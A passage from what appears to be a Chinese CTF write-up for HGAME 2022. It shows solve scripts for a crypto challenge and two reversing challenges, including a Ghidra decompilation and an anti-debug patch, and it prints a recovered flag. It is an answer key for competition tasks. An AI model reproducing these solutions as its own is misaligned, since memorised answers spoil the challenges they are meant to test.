</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> v[]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">0x457E62CF</span>, <span style="color:#ae81ff">0x9537896C</span>, <span style="color:#ae81ff">0x1F7E7F72</span>, <span style="color:#ae81ff">0xF7A073D8</span>, <span style="color:#ae81ff">0x8E996868</span>, <span style="color:#ae81ff">0x40AFAF99</span>, <span style="color:#ae81ff">0xF990E34</span>, <span style="color:#ae81ff">0x196F4086</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> <span style="color:#66d9ef">const</span> k[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> r<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">decipher</span>(r, v, k);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">decipher</span>(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, k);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">decipher</span>(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>, k);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">decipher</span>(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>, k);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="cryptothe-password-plus-pro-max-ultra">[Crypto]The Password Plus Pro Max Ultra</h3>
<p>进行了一下数学推导</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 85; 
			flex-basis: 206px"
	>
	<a href="/post/hgame2022-writeups/thepasswordppmu.png" data-size="1667x1940">
		<img src="/post/hgame2022-writeups/thepasswordppmu.png"
			width="1667"
			height="1940"
			srcset="/post/hgame2022-writeups/thepasswordppmu_hu1e60315d6ac126f95d826105b72244f0_551164_480x0_resize_box_3.png 480w, /post/hgame2022-writeups/thepasswordppmu_hu1e60315d6ac126f95d826105b72244f0_551164_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>结论就是做 64 次加密就回来了</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 284; 
			flex-basis: 681px"
	>
	<a href="/post/hgame2022-writeups/thepasswordppmu_poc.jpg" data-size="628x221">
		<img src="/post/hgame2022-writeups/thepasswordppmu_poc.jpg"
			width="628"
			height="221"
			srcset="/post/hgame2022-writeups/thepasswordppmu_poc_hu7cecdefa604a15e3cd54782414f5dfcd_20981_480x0_resize_q75_box.jpg 480w, /post/hgame2022-writeups/thepasswordppmu_poc_hu7cecdefa604a15e3cd54782414f5dfcd_20981_1024x0_resize_q75_box.jpg 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>最后求解</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> functools <span style="color:#f92672">import</span> reduce
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> operator <span style="color:#f92672">import</span> xor
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> random <span style="color:#f92672">import</span> sample
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> re <span style="color:#f92672">import</span> findall
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> s2n
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">move</span>(n, k):
</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> bin(n)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>    k <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">63</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> int(s[k:] <span style="color:#f92672">+</span> s[:k], <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(x, ks):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> xor(x, reduce(xor, map(<span style="color:#66d9ef">lambda</span> k: move(x, k), ks)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(x, ks):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">63</span>):
</span></span><span style="display:flex;"><span>            x <span style="color:#f92672">=</span> encrypt(x, ks)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> x
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">35</span>], [<span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">45</span>],  [<span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">55</span>],  [<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">63</span>], [<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">59</span>], [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">62</span>], [<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">58</span>], [<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">61</span>],  [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">62</span>],  [<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">62</span>], [<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">60</span>], [<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">53</span>], [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">62</span>]]
</span></span><span style="display:flex;"><span>xs <span style="color:#f92672">=</span> [<span style="color:#ae81ff">2656224875120172108</span> , <span style="color:#ae81ff">1261711348908201279</span> , <span style="color:#ae81ff">18219282869614004824</span>, <span style="color:#ae81ff">15279054981769814589</span>, <span style="color:#ae81ff">7966355346882200701</span> , <span style="color:#ae81ff">5641592208539483808</span> , <span style="color:#ae81ff">1502927090219059154</span> , <span style="color:#ae81ff">3996223120734273799</span> , <span style="color:#ae81ff">18295033054788808618</span>, <span style="color:#ae81ff">18126228466291248047</span>, <span style="color:#ae81ff">9413762634844369954</span> , <span style="color:#ae81ff">8964324149921197550</span> , <span style="color:#ae81ff">6962485320551449848</span> ]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> n2s
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(xs)):
</span></span><span style="display:flex;"><span>    y <span style="color:#f92672">=</span> decrypt(xs[i], ks[i])
</span></span><span style="display:flex;"><span>    print (n2s(y)<span style="color:#f92672">.</span>decode(), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># hgame{XOr|RoR&amp;rOl|Is+vERY#coMmon*BiTwisE$OPeraTiOn*IT@is%oFten,ENCOUntErED*in.syMMeTRic?encryPtION}</span>
</span></span></code></pre></div><p>据说这个加密方法和求逆多项式还有关系，很神奇</p>
<h2 id="week3">Week3</h2>
<h3 id="reanswers-windows">[RE]Answer&rsquo;s windows</h3>
<p>使用 <code>right.png</code> 字符串能够定位到验证函数</p>
<p>动调发现使用了 string 的存储方式（好像就是把 string 内联了），只使用了 Base64 编码</p>
<p>但 base 表和目标对应不上，显然是有反调试，自己做的时候直接猜到了真实表是 ascii 的前 64 个可见字符</p>
<p>或者根据交叉引用找到 debug，把反调试判断 <code>nop</code> 掉再动调即可</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 283; 
			flex-basis: 679px"
	>
	<a href="/post/hgame2022-writeups/Answers_windows_solve.jpg" data-size="1084x383">
		<img src="/post/hgame2022-writeups/Answers_windows_solve.jpg"
			width="1084"
			height="383"
			srcset="/post/hgame2022-writeups/Answers_windows_solve_huc3bc26e113c65b72fa0fc4de0f5ee895_47933_480x0_resize_q75_box.jpg 480w, /post/hgame2022-writeups/Answers_windows_solve_huc3bc26e113c65b72fa0fc4de0f5ee895_47933_1024x0_resize_q75_box.jpg 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h3 id="recreakme_3">[RE]creakme_3</h3>
<p>PPC 架构，用 ghidra 看的</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> fs;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> randnum;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> j;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> order_cnt;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> order [<span style="color:#ae81ff">89</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> canary;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(fs <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x7008</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(order,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x164</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Welcome my whitegive re task! This is your flag: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x59</span>; j <span style="color:#f92672">=</span> j <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>      randnum <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>();
</span></span><span style="display:flex;"><span>      order[j] <span style="color:#f92672">=</span> randnum <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x59</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    order_cnt <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ((order_cnt <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x59</span> <span style="color:#f92672">&amp;&amp;</span> (a[order[order_cnt <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;=</span> a[order[order_cnt] <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>])))
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      order_cnt <span style="color:#f92672">=</span> order_cnt <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (order_cnt <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x59</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x59</span>; i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">putchar</span>(a[order[i] <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (canary <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(fs <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x7008</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__stack_chk_fail</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>手动恢复了一下符号，简单的说就是只有满足顺序都是 <code>&lt;=</code> 的时候才能退出第一个循环，所以 <code>rand()</code> 只是个忽悠人并且浪费时间的东西（后来知道这个东西叫猴子加密）</p>
<p>所以提取一下数字然后排序就行</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>a <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x4E7D</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x67BD</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x7A48</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x82A2</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x933E</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x9C18</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x5AFF</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x6CD7</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0xA6CA</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0xBD79</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0xCEBD</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x324A</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x3292</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x3905</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x4291</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x5ADE</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x6E9F</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0xA52A</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0xBE35</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0xCB63</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x7F3B</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0x3914</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0xB2AD</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x38DA</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x4E50</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x6A02</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0xB10F</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x78E5</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0x7EF6</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0x89A3</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0x8EBD</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0x95E3</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x73DA</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x538C</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x633B</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x9E9C</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0xB78B</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0xC866</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x32AE</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x7679</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x2AE7</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x4D6A</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x5708</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x6610</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xA258</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xB80C</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xC885</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x710A</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x7CF4</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x3F76</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x702B</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0xA3EE</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0xAD50</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0xBAC7</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x4024</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x8A22</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0xC055</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0x2B52</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0xC687</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x6B</span>, <span style="color:#ae81ff">0x5F00</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x6B</span>, <span style="color:#ae81ff">0xC417</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x6C</span>, <span style="color:#ae81ff">0x6182</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x6D</span>, <span style="color:#ae81ff">0x75DB</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x6E</span>, <span style="color:#ae81ff">0x3C61</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x6E</span>, <span style="color:#ae81ff">0x4996</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x6E</span>, <span style="color:#ae81ff">0x5DC1</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x6F</span>, <span style="color:#ae81ff">0x2D76</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x6F</span>, <span style="color:#ae81ff">0x7D17</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x6F</span>, <span style="color:#ae81ff">0xA91B</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x9AED</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x45D0</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x8467</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0xAB5D</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x5083</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x6222</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x8D93</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x923A</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x971E</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0xB4BA</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0xC785</span>),
